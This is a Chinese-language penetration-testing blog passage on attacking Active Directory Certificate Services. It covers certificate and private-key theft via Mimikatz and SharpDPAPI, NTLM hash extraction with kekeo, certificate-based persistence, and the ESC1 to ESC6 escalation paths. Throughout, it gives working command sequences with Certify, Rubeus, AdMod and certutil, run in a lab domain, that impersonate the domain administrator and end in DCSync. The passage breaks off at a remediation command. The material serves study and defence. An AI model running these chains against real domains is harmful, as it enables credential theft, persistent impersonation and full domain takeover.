提取用户或机器证书和私钥的最简单方法是通过交互式桌面会话。如果私钥是可导出的，只需右键单击 `certmgr.msc` 中的证书，然后转到 “所有任务”，选择 “导出”，来导出受密码保护的 .pfx 文件。也可以以编程方式完成此操作。示例包括 PowerShell 的 Export-PfxCertificate Cmdlet 或 TheWover 的 CertStealer C# 项目。

本文所介绍的这些方法使用 Microsoft CryptoAPI（CAPI）或更现代的 Cryptography API：Next Generation（CNG）与证书存储进行交互。这些 API 执行证书存储和身份验证（以及其他用途）所需的各种加密服务。

如果私钥是不可导出的，CAPI 和 CNG 将不允许提取不可导出的证书。 但是 Mimikatz 的 `crypto::capi` 和 `crypto::cng` 命令可以 Patch CAPI 和 CNG 以允许导出私钥。`crypto::capi` 在当前进程中 Patch CAPI，而 `crypto::cng` 可以 Patch lsass.exe 的内存，相关命令如下。如下图所示，导出的证书将以 .der 和 .pfx 格式保存到磁盘上。

```console
C:\Users\Marcus\Desktop> mimikatz.exe "crypto::capi" "crypto::certificates /export" exit
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/p6I29XoNY5SG4Tm.png)

### 0.4.2 User Certificate Theft via DPAPI – THEFT2

Windows 使用 DPAPI 存储证书私钥。微软打破了用户和机器私钥的存储位置，手动解密加密的 DPAPI blob 时，开发人员需要了解操作系统用作私钥文件结构的哪个加密 API 在两个 API 之间不同。使用 SharpDPAPI 时，它会自动考虑这些文件格式差异。

Windows 常将用户证书存储在注册表项 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\SystemCertificates` 中，尽管用户的一些个人证书也存储在 `%APPDATA%\Microsoft\SystemCertificates\My\Certificates\`。关联的用户私钥位置主要位于 `%APPDATA%\Microsoft\Crypto\RSA\User SID\` （用于 CAPI 密钥）和 `%APPDATA%\Microsoft\Crypto\Keys\`（用于 CNG 密钥）。Benjamin Delpy 在 Mimikatz 中很好地分解了这些结构，从这些结构中，可以得出：

- 解密受私钥保护的 blob 所需的 DPAPI 主密钥。这定义了解密私钥所需的用户/机器主密钥（由 GUID 标识）。
- 私钥的 UniqueName，也称为密钥容器名称。Windows 以某种类型的原始格式存储证书，元数据以证书的实际数据为前缀。此 UniqueName 或私钥文件名嵌入此元数据中，并且可能是将私钥链接到其关联证书的最佳方式。

要想成功获得证书及其相关的私钥，需要做以下工作：

1. 确定想要从用户的证书存储中窃取哪个证书并提取密钥存储名称。
2. 找到解密相关私钥所需的 DPAPI 主密钥。
3. 获取明文 DPAPI 主密钥并使用它来解密私钥。

有多种方法可以解密 DPAPI 主密钥（MasterKey）。在域环境中，用户主密钥的副本使用 DPAPI 备份密钥进行加密，这种备份密钥是所有域控制器中共享的。这意味着使用 DPAPI 域备份密钥可以解密任何域用户的主密钥文件。可以在目标用户的安全上下文中运行 Mimikatz，使用其 `dpapi::masterkey /in:"C:\PATH\TO\KEY" /rpc` 命令可以成功检索帐户的主密钥。此外，如果知道用户的密码，可以使用 SharpDPAPI 的 `masterkeys` 命令或 Mimikatz 的 `dpapi::masterkey /in:"C:\PATH\TO\KEY" /sid:accountSid /password:PASS` 命令来解密账户的 MasterKey 文件。

为了简化主密钥文件和私钥文件的解密过程，SharpDPAPI 的 `certificates` 命令可以与 `/pvk`、`/mkfile`、`/password` 或 `{GUID}:SHA1` 参数一起使用来解密私钥和相关证书，输出 .pem 格式的文本文件内容。

```console
C:\Users\Marcus\Desktop> SharpDPAPI.exe certificates {GUID}:SHA1
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/hmlIJ4Lo2jDztxF.png)

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/v8XcSJQ4aRKqtWE.png)

如果 SharpDPAPI 的执行结果中显示 “[!] Certificate can be used for client auth!”，则表示该证书允许域身份验证。此时，可以使用 SharpDPAPI 输出末尾显示的 openssl 命令将 .pem 转换为 .pfx，相关命令如下。一旦转换为 .pfx 文件，就可以通过 Rubeus 为该用户账户申请 TGT 并代表该用户进行域身份验证。在转换时需要输入一个自定义的密码，以保护生成的 .pfx 文件，该密码在后续 Rubeus 的利用过程中会用到。

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### 0.4.3 Machine Certificate Theft via DPAPI – THEFT3

Windows 将机器证书存储在注册表项 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates` 中，并根据帐户将私钥存储在几个不同的位置。尽管 SharpDPAPI 会搜索所有这些位置，但最主要的往往还是 `%ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\RSA\MachineKeys`（CAPI）和 `%ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\Keys` (CNG)。这些私钥与机器证书存储相关联，Windows 使用机器的 DPAPI 主密钥对它们进行加密。无法使用域 DPAPI 备份密钥解密这些密钥，而必须使用系统上的 DPAPI_SYSTEM LSA 机密，该机密只能由 SYSTEM 用户访问。您可以使用 Mimikatz 的 `lsadump::secrets` 命令手动执行此操作，然后使用提取的密钥解密机器主密钥。您还可以像以前一样 Patch `CAPI/CNG` 并使用 Mimikatz 的 `crypto::certificates /export /systemstore:LOCAL_MACHINE` 命令。

SharpDPAPI 中带有 `/machine` 参数的 `certificates` 命令（需要在提升的上下文中运行）将自动提升到 SYSTEM，转储 DPAPI_SYSTEM LSA 机密，使用它来解密并找到机器 DPAPI 主密钥，并使用主密钥明文来解密任何机器证书私钥。

```console
C:\Users\Marcus\Desktop> SharpDPAPI.exe certificates /machine
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/AyFxCiscvGhjuNg.png)

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/ToS6fJham2eZPdW.png)

如果 SharpDPAPI 的执行结果中显示 “[!] Certificate can be used for client auth!”，则表示该证书允许域身份验证。此时，可以使用 SharpDPAPI 输出末尾显示的 openssl 命令将 .pem 转换为 .pfx，相关命令如下。一旦转换为 .pfx 文件，就可以通过 Rubeus 为该机器账户申请 TGT 并代表该机器用户进行域身份验证。

### 0.4.4 Finding Certificate Files – THEFT4

有时证书和它们的私钥只是散落的分布在文件系统上，不需要从系统存储中提取它们。例如，我们在文件共享、管理员的下载文件夹、源代码存储库和服务器的文件系统以及许多其他地方中看到了导出的证书及其私钥。

我们见过的最常见的以 Windows 证书文件类型是 .pfx 和 .p12 文件，其中 .pkcs12 有时会出现但不太常见。这些是 PKCS#12 格式的文件，一种通用的存档格式，用于将一个或多个加密对象存储在单个文件中。这是 Windows 在导出证书时使用的格式，并且通常受密码保护，因为 Windows GUI 需要设置密码。另一种常见格式是 .pem 文件，其中包含证书的 Base64 编码及其关联的私钥。使用 openssl 可以轻松地在这些格式之间进行转换。

下表所示为常见证书相关的文件扩展名：

|    File Extension    |                         Description                          |
| :------------------: | :----------------------------------------------------------: |
|         .key         |                Contains just the private key.                |
|      .crt/.cer       |                Contains just the certificate.                |
|         .csr         | Certificate signing request file. This does not contain certificates or  keys. |
| .jks/.keystore/.keys | Java Keystore. May contain certs + private keys used by Java  applications. |

### 0.4.5 NTLM Credential Theft via PKINIT – THEFT5

Certificate/PKINIT 的滥用为攻击者提供了一个额外的攻击方式——NTLM 凭证窃取。正如 [@gentilkiwi](https://twitter.com/gentilkiwi) 推文中所描述的那样：

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/7huEHdXv2AOteIU.png)

Microsoft 在 MS-PKCA（Microsoft 的 Kerberos PKINIT 技术规范）的 “1.4 Relationship to Other Protocols” 部分中指出：

> *“In order to support NTLM authentication [MS-NLMP] for applications  connecting to network services that do not support Kerberos authentication,  when PKCA is used, the KDC returns the user’s NTLM one-way function (OWF)  in the privilege attribute certificate (PAC) PAC_CREDENTIAL_INFO buffer”*

也就是说，当使用证书进行 Kerberos PKINIT 身份验证的时候，返回的票据的 PAC 包里面包含用户的 NTLM 凭据。获取这个 NTLM 凭据涉及解密 PAC_CREDENTIAL_DATA 结构，Benjamin Delpy 早在 2016 年就已经在 Kekeo 和 Mimikatz 中实现了这一点，相关命令如下。

```console
C:\Users\Marcus\Desktop> kekeo.exe "tgt::pac /caname:pentest-DC01-CA /subject:Marcus /castore:current_user /domain:pentest.com" exit
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/GpyFBQTows7vPXO.png)

即使用户将密码改了，通过证书也随时都可以获取 NTLM。将可以与窃取 AD CA 证书或接下来将介绍的伪造证书结合起来，将获取到的证书导入本地计算机上，然后通过代理进入内网，这样就可以随时获取受害用户的当前 NTLM Hash。

## 0.5 账户持久性

### 0.5.1 Active User Credential Theft via Certificates – PERSIST1

如果存在企业 CA，则用户可以用任何可供他们注册的模板来申请证书。在用户凭据被盗的情况下，攻击者可以通过允许域身份验证的模板来为用户申请证书。所使用的证书模板需要具有以下属性：

- 该证书模板公开注册。
- 允许域用户（或用户所属的组）进行注册。
- 至少具有以下任何可启用域身份验证的 EKU：
  - Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
  - Client Authentication (1.3.6.1.5.5.7.3.2) 
  - PKINIT Client Authentication (1.3.6.1.5.2.3.4)
  - Any Purpose EKU (2.5.29.37.0)
  - No EKU set. i.e., this is a (subordinate) CA certificate.
- 不需要证书管理员批准或 “授权签名” 签发要求。

幸运的是，有一个已发布的模板允许这样做，即 User 模板。但是，虽然此模板是 AD CS 的默认模板，但某些环境可能会禁用它。

Certify 可以在 LDAP 中查询符合上述条件的可用模板，相关命令如下。

```console
C:\Users\Marcus\Desktop> Certify.exe find /clientauth
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/ErQzVNX6pR7DWaO.png)

如上所示，User 模板存在并且符合条件，其默认的有效期为一年，但我们经常看到使用的自定义模板会增加过期时间。值得注意的是，如果攻击者恶意注册此类模板，只要证书有效，即使用户更改密码，证书也可以作为该用户进行身份验证。

如果我们有对目标机的 GUI 访问权限，我们可以通过 `certmgr.msc` 或通过 `certreq.exe` 命令手动请求证书。此外，通过 Certify 在当前用户上下文中指定证书模板，也可以为用户申请证书，相关命令如下。

```console
C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:User

# Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/2sVmad4UxWiIjLk.png)

需要注意的是，要想成功使用 Certify 的 `request` 命令，需要将 Certify 项目中生产的 DLL 依赖 Interop.CERTENROLLLib.dll 复制到 Certify.exe 的相同目录下。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/YjSfHXiR8qE23tD.png)

成功执行后，将输出证书 + 私钥的 .pem 格式的文本块，需要使用前面提到过的 openssl 命令将其转换为与 Rubeus 兼容的 .pfx 格式。

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

然后可以将 .pfx 上传到目标并与 Rubeus 一起使用，为该用户请求 TGT 并将其传递到内存中，相关命令如下，执行结果如下图所示。

```console
C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Marcus /certificate:C:\Users\Marcus\cert.pfx /password:Passw0rd /ptt
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Umz7MuDdhReQ4Px.png)

执行 `klist` 命令，可以看到当前主机内存中已保存了 Marcus 用户的 TGT 票据，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/n4jtVgOPidUX8za.png)

由于证书是一个独立的身份验证凭证，即使用户重置密码，该证书仍然可以使用。结合前文中 “NTLM Credential Theft via PKINIT – THEFT5” 部分所介绍的技术，攻击者还可以持续获取帐户的 NTLM 哈希，攻击者可以使用该哈希通过传递哈希进行身份验证或破解以获取明文密码。 总体而言，这是一种不涉及 LSASS 的而实现长期凭证窃取的替代方法，并且可以在非提升的环境中进行。

### 0.5.2 Machine Persistence via Certificates - PERSIST2

机器帐户本质上就是一种特殊类型的用户帐户，其拥有用户账户的所有属性。如果证书模板与 User 模板的要求相匹配，但允许域内机器作为注册主体，则攻击者可以为失陷系统的机器帐户注册证书。默认的 Machine 模板匹配所有这些必要特征。

如果攻击者提升了失陷系统的权限，攻击者可以使用 SYSTEM 帐户权限为当前机器账户注册证书，Machine 模板授予机器帐户注册权限。Certify 在请求机器账户证书时需要使用 `/machine` 参数完成此操作，相关命令如下。

```console
C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:Machine /machine

# Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME /machine
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/qcFvEgtXbx14HQJ.png)

后续的操作请参考 “Active User Credential Theft via Certificates – PERSIST1”。通过机器帐户证书，攻击者可以作为机器帐户进行 Kerberos 身份验证，以机器账户的身份完成特定操作。例如使用 Kerberos S4U 扩展协议，攻击者可以代表任何用户获得其他主机上一些服务（例如，CIFS、LDAP、HTTP、RPCSS 等）的 ST 票据。详情请参考我的另一篇博客：[*Abusing Domain Delegation to Attack Active Directory*](https://whoamianony.top/posts/domain-delegation-attack/)。

## 0.6 域权限提升

至此，您可能意识到证书和 PKI 并不简单，尤其是在 AD 中。这是一个没有多少人试图从安全角度理解的领域。虽然 AD CS 本身并没有任何不安全之处，就像任何没有经过大量审查的系统一样，组织很容易错误地配置它，从而严重影响其环境的安全性。

### 0.6.1 Misconfigured Certificate Templates - ESC1

证书模板有一组特定的设置，使它们极易被攻击者利用，以实现域权限提升。下面我们来介绍第一种配置情况（ESC1）：

1. 企业 CA 授予低特权用户注册权限。
2. CA 证书管理程序批准被禁用。
3. 无需授权签名。
4. 过于宽松的证书模板安全描述符会向低特权用户授予证书注册权限。
5. 证书模板定义了启用域身份验证的 EKU。
6. 证书模板允许请求者在 CSR 中指定 subjectAltName。

这里主要关注到最后一个配置条件。回想一下，在 AD 身份验证期间，AD 将使用证书的 subjectAltName（SAN）字段指定身份。因此，如果请求者可以在 CSR 中指定 SAN，则请求者可以以任何人（例如，域管理员用户）的身份请求证书。证书模板在其 AD 对象的 [`mspki-certificate-name-flag`](https://docs.microsoft.com/zh-tw/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1) 属性中指定请求者是否可以在其中指定 SAN。`mspki-certificate-name-flag` 属性是位掩码，如果存在 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，则请求者可以指定 SAN。在证书模板控制台 MMC 管理单元中，此值在模板的 “属性” 的 “使用者名称” 选项卡中进行设置，如下图所示，勾选 “在请求中提供(S)” 即可。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Mv5YanSlBeTrPdo.png)

上述这些配置允许低权限用户使用任意的 SAN 请求证书，导致低权限用户能够通过 Kerberos 或 SChannel 以域中的任何主体身份进行身份验证。

指定 SAN 的能力是这种错误配置的症结所在。但该配置通常情况下是启用的。在证书模板控制台 MMC 管理单元中，如果管理员启用 “在请求中提供(S)” 选项，则会出现警告，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/rVhOuvKD6e9n4Qq.png)

但是，如果网络管理员不熟悉 PKI，他们很可能会为了使服务正常运行而忽略该警告。此外，网络管理员在创建自己的证书模板时，可能会复制 AD CS 附带的默认 WebServer 模板。WebServer 模板启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，然后如果网络管理员又添加了 “客户端身份验证” 或 “智能卡登录” 的EKU，则会发生上述的攻击的场景。

这并不是一个牵强附会的想法，因为网络管理员通常在部署 AD CS 服务器后首先要做的事情之一就是创建 HTTPS 证书。此外，许多应用程序使用 SSL/TLS 相互身份验证，在这种情况下，网络管理员可能会错误地启用服务器身份验证和客户端身份验证 EKU，从而导致配置易遭到滥用。

综上所述，如果有一个完全匹配上述配置的已发布的证书模板，攻击者可以以域内任何用户的身份请求证书，包括域管理员用户或域控制器的机器账户，并使用该证书获取合法用户的 TGT，依次实现域权限提升。

下面是我们使用 Certify 枚举的易遭到滥用的证书模板，相关命令如下。

```console
C:\Users\Marcus\Desktop> Certify.exe find /vulnerable
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/TdrHXASDL428atK.png)

如上图所示，证书模板 VulnTemplate 在 `msPKI-Certificate-Name-Flag` 属性中启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，并且具有客户端身份验证的 EKU，并授予所有域用户注册权限。

此外，也可以通过 AdFind 等工具直接查询活动目录，并过滤出所有不需要批准/授权签名、具有客户端身份验证或智能卡登录 EKU 并启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志的证书模板，相关语法如下。

```console
C:\Users\Marcus\Desktop> AdFind.exe -b "CN=Configuration,DC=pentest,DC=com" -f "(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))"
```

下面，我们可以在当前未提升的上下文中运行 Certify 来请求证书，并将 `/altname` 指定为域管理员，相关命令如下。

```console
C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:VulnTemplate /altname:PENTEST\Administrator
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/AZ5eHSkVJtCRmj2.png)

如上图所示，成功为域管理员用户 Administrator 注册了一个证书。在使用 openssl 转换为 .pfx 格式后，这个证书允许我们通过以 Administrator 的身份请求一个 TGT，相关命令如下。

```console
C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Administrator /certificate:C:\Users\Marcus\cert.pfx /password:Passw0rd /ptt
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/kXwtjmhaqrBc3uG.png)

如上图所示，成功为 Administrator 请求到 TGT，并将其传递到当前机器的内存中，执行 `klist` 命令可以看到机器中保存的 TGT，然后我们可以使用它来访问域控制器，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/zdC8G3tZEU17roJ.png)

并且此时可以向域控执行 DCSync 操作并导出用户哈希，说明此时已经提升至了域管理权限，相关命令如下。

```console
C:\Users\Marcus\Desktop> mimikatz.exe "lsadump::dcsync /domain:pentest.com /user:PENTEST\Administrator" exit
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/qiJvOorEWYLISn3.png)

### 0.6.2 Misconfigured Certificate Templates - ESC2

第二种滥用情况（ESC2）是第一种情况（ESC1）的变体。ESC2 的利用条件如下：

1. 企业 CA 授予低特权用户注册权限。细节与 ESC1 相同。
2. CA 证书管理程序批准被禁用。细节与 ESC1 相同。
3. 无需授权签名。细节与 ESC1 相同。
4. 过于宽松的证书模板安全描述符会向低特权用户授予证书注册权限。细节与 ESC1 相同。
5. 证书模板定义了 Any Purpose 类型的 EKU 或 SubCA 类型的 EKU。前者 Any Purpose 指证书可以用于任何目的，后者 SubCA 指证书没有 EKU，相当于从属 CA 的证书。

这里重点关注最后一个条件。虽然具有此类 EKU 的模板不能用于在没有 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志（即 ESC1）的情况下以其他用户身份请求身份验证证书，但攻击者可以使用它们以请求它们的用户身份向 AD 进行身份验证，这两个 EKU 无疑是对请求它们的用户自身很危险。

攻击者可以将具有 Any Purpose EKU 的证书用于任何目的，这包括客户端身份验证、服务器身份验证、代码签名等。相比之下，攻击者可以使用 SubCA EKU 的证书用于任何目的也是如此，但也可以使用它来签署新证书。因此，使用  SubCA 证书，攻击者可以在新证书中指定任意 EKU 或字段。

但是，如果 `TAuthCertificates` 对象不信任从属 CA（默认情况下不会信任），则攻击者无法创建可用于域身份验证的新证书。尽管如此，攻击者仍可以创建具有 Any Purpose EKU 的新证书，其中有很多攻击者可能滥用（例如代码签名、服务器身份验证等），并且可能对网络中的其他应用程序（如 SAML、AD FS 或 IPSec）产生重大影响。

综上所述，如果攻击者可以获得 Any Purpose 或 SubCA 证书，无论它是否受 `NTAuthCertificates` 信任，这都是非常糟糕的。通过枚举 LDAP 可以过滤出所有可用于枚举与此类滥用条件相匹配的模板，相关命令如下。

```console
C:\Users\Marcus\Desktop> AdFind.exe -b "CN=Configuration,DC=pentest,DC=com" -f "(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))"
```

### 0.6.3 Misconfigured Enrollment Agent Templates - ESC3

第三种滥用场景 (ESC3) 类似于 ESC1 和 ESC2，但滥用了不同的 EKU，并且利用到了我们前文中所讲到的 “注册代理”。证书请求代理 EKU（OID 1.3.6.1.4.1.311.20.2.1）在 Microsoft 文档中称为 “注册代理”，它允许委托人代表另一个用户注册证书。

AD CS 通过其 EKU 中带有证书申请代理 OID（1.3.6.1.4.1.311.20.2.1）的证书模板来完成注册代理操作。注册代理在此类模板中注册，并使用生成的证书代表其他用户共同签署 CSR，然后它将共同签署的 CSR 发送给 CA。

要滥用此类场景，CA 需要至少以下两组匹配条件的证书模板：

- 条件 1：这个模板允许低权限用户注册代理证书。
  1. 企业 CA 授予低特权用户注册权限。细节与 ESC1 相同。
  2. CA 证书管理程序批准被禁用。细节与 ESC1 相同。
  3. 无需授权签名。细节与 ESC1 相同。
  4. 过于宽松的证书模板安全描述符会向低特权用户授予证书注册权限。细节与 ESC1 相同。
  5. 证书模板定义了证书申请代理 EKU。证书申请代理 OID（1.3.6.1.4.1.311.20.2.1）允许代表其他主体请求其他证书模板。
- 条件 2：另一个模板需要允许低权限用户使用注册代理证书代表另一个用户来请求证书，并且该模板定义了一个允许域身份验证的 EKU。
  1. 企业 CA 授予低特权用户注册权限。细节与 ESC1 相同。
  2. CA 证书管理程序批准被禁用。细节与 ESC1 相同。
  3. 模板架构版本 1 或大于 2 并在发布要求中指定了需要证书申请代理 EKU 的应用程序策略。关于发布要求的细节可以参考前文。
  4. 证书模板定义了启用域身份验证的 EKU。
  5. 注册代理限制未在 CA 上实施。

以下是匹配条件 1 的模板的示例：

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Y6XUWMyD3J8NPdF.png)

以下是匹配条件 2 的模板的示例：

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/xX5uyIOaPv3wk78.png)

此时，攻击者可以先请求注册代理证书 Vuln-EnrollmentAgent，相关命令如下。

```console
C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:Vuln-EnrollmentAgent
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/i7q6OAvJ9xzHX31.png)

将得到的注册代理证书使用 openssl 转换为 .pfx 格式，然后，用它来代表另一个用户（例如域管理员用户）向允许域身份验证的模板发出证书注册请求，相关命令如下。

```console
C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:Vuln-EnrollmentAgent-AuthorizedSignatures /onbehalfof:PENTEST\Administrator /enrollcert:Vuln-EnrollmentAgentCert.pfx /enrollcertpw:Passw0rd
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/geXjGHpbKv8QArT.png)

如上图所示，成功为域管理员用户 Administrator 注册了一个证书。在使用 openssl 转换为 .pfx 格式后，这个证书允许我们通过以 Administrator 的身份请求一个 TGT，相关命令如下。

```console
C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Administrator /certificate:C:\Users\Marcus\cert.pfx /password:Passw0rd /ptt
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/D2kN1sCrbj6TlPV.png)

### 0.6.4 Vulnerable Certificate Template Access Control - ESC4

证书模板是活动目录中的安全对象，这意味着它们具有安全描述符，用来指定哪些 AD 主体对自己具有哪些特定的权限。如果模板具有允许非特权的 AD 主体编辑模板中的敏感安全设置的访问控制项（ACE），则可以说该模板在访问控制级别配置错误。

举个例子，如果攻击者对模板对象拥有 WriteProperty 权限，则其可以修改模板 AD 对象属性，则他们可以直接将错误配置推送到不易受攻击的模板，例如通过为允许域身份验证的模板在 `mspki-certificate-name-flag` 属性中启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，这会导致与 “Misconfigured Certificate Templates - ESC1” 相同的滥用场景。

从安全角度来看，我们应该关心模板对象所拥有的 ACE 是证书模板中的 “完全控制”（Full Control）和 “写入”（Write）类权限，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/pJKVj2kGuU4onr9.png)

总的来说，攻击者关心的敏感权限如下表所示。

|     Right     |                         Description                          |
| :-----------: | :----------------------------------------------------------: |
|     Owner     | Implicit full control of the object, can edit any properties. |
|  FullControl  |     Full control of the object, can edit any properties.     |
|  WriteOwner   |  Can modify the owner to an attacker-controlled principal.   |
|   WriteDacl   | Can modify access control to grant an attacker FullControl.  |
| WriteProperty |                   Can edit any properties.                   |

Certify 的 `find` 命令会枚举所有证书模板的访问控制条目（BloodHound 团队也在积极集成此类枚举），如下图所示。

```console
C:\Users\Marcus\Desktop> Certify.exe find
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/cM6mXPeOfEB1Rjz.png)

在途中可以看到，Authenticated Users 组的用户对 VulnAceTemplate 模板拥有 WriteProperty 权限，也就是说所有经过身份验证的用户都可以修改 VulnAceTemplate 对象的属性，执行以下命令，通过 [AdMod](http://www.joeware.net/freetools/tools/admod/) 在模板对象的 `mspki-certificate-name-flag` 属性中启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志。

```console
C:\Users\Marcus\Desktop> AdMod.exe -b "CN=VulnAceTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=pentest,DC=com" "msPKI-Certificate-Name-Flag::1"
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/2318jAxKrLigNhM.png)

执行后，将成功在模板对象 VulnAceTemplate 的 `mspki-certificate-name-flag` 属性中启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，如下图所示。此时攻击者可以指定 SAN，为任何域用户申请证书，并用该证书进行域身份验证。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/wtesPlRV6SBd79n.png)

### 0.6.5 Vulnerable PKI Object Access Control - ESC5

可能影响 AD CS 安全性的基于 ACL 的互连关系网络非常广泛。除了证书模板以外，其他相关对象和证书颁发机构本身可能会对整个 AD CS 系统产生安全影响。这些可能性包括但不限于：

- CA 服务器的 AD 计算机对象（即通过 S4U2Self 或 S4U2Proxy）
- CA 服务器的 RPC/DCOM 服务器
- 容器中的任何子代 AD 对象或容器 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM>`（例如，证书模板容器、证书颁发机构容器、NTAuthCertificates 对象、 注册服务容器等）

如果低权限攻击者可以控制其中任何一个，则该攻击可能会危及 PKI 系统。

### 0.6.6 CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

CQure Academy 在其发布的文章 [*The tale of Enhanced Key (mis) Usage*](https://cqureacademy.com/blog/enhanced-key-usage) 中描述了另一个类似的问题，它涉及 CA 的 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志。正如 Microsoft 所描述的，“*If this flag is set on the CA,  any request (including when the subject is built from Active Directory®) can have user defined  values in the subject alternative name*”。这意味着攻击者可以为任何域用户注册证书，包括启用了客户端身份验证 EKU 的证书，从而达到与启用 “Misconfigured Certificate Templates - ESC1” 中所述的 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志相同的效果。

要在 CA 上启用 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志，需要在 AD CS 服务器上执行以下命令并重启 CertSvc 服务，这将在注册表项 `\CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy` 的 `EditFlags` 键中设置 `EDITF_ATTRIBUTESUBJECTALTNAME2` 值。

```console
C:\Users\Marcus\Desktop> certutil -config "DC01.pentest.com\pentest-DC01-CA" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2

# certutil -config "CA_HOST\CA_NAME" -setreg "policy\RegistryValueName" +Value
```

此时执行以下命令，可以看到 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志已在 CA 上启用，如下图所示。

```console
C:\Users\Marcus\Desktop> certutil -config "DC01.pentest.com\pentest-DC01-CA" -getreg "policy\EditFlags"
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/AfEcOzsMP1LY3rw.png)

Certify 的 `find` 命令也将尝试检查它枚举的每个 CA 证书颁发机构的这个标志值：

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/uoAWqHdF7yrVBsS.png)

要滥用这一点，只需将 `/altname` 标志与任何允许域身份验证的模板一起使用。在这种情况下，让我们使用 User 模板（它默认不允许我们指定主题名称），并为域管理员用户 Administrator 申请证书。

```console
C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:User /altname:PENTEST\Administrator
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/hvyIO4lA2tqoB56.png)

如果您在自己的 AD CS 环境中发现了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 设置，可以使用以下命令删除此标志：

```console
